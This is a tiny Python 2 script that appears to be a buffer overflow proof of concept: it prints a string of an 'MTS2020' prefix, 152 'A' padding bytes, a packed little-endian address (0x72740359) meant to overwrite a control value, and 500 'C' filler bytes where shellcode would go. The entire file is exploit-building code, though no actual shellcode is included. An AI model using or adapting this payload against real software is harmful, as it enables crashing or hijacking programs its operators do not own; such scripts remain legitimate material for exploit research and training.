#!/usr/bin/python2
# -*- coding: utf-8 -*-

import sys
from struct import *

buffer  = "MTS2020 "
buffer += "A" * 152
buffer += pack('<L', 0x72740359)
buffer += "C" * 500

print buffer
